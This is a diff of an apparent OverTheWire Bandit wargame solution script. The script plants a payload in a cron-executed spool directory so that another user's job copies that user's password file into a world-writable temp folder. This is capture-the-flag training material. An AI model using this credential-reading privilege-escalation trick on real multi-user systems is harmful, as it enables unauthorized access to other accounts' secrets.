@@ -81,15 +81,14 @@ cat > payload <<eof
 
 SRC="/etc/bandit_pass/bandit24"
 DST="/tmp/tmp.98u7LMDfzh/pass" # adjust the path!
-
 cat "\$SRC" > "\$DST"
 eof
+# ^ totally not overkill lmao
 
 # lastly: the script needs the x bit such that bandit24 can execute it
 # & the temp dir also needs more open perms for bandit24 to write into it,
 # recall the sticky bit that's on `/tmp`
 
-touch pass # otherwise bandit24 creates `pass` in a bandit23 owned dir
 chmod -R 777 . # recursively apply rwx to the dir & all contents inside
 cp -a payload /var/spool/bandit24/foo
 
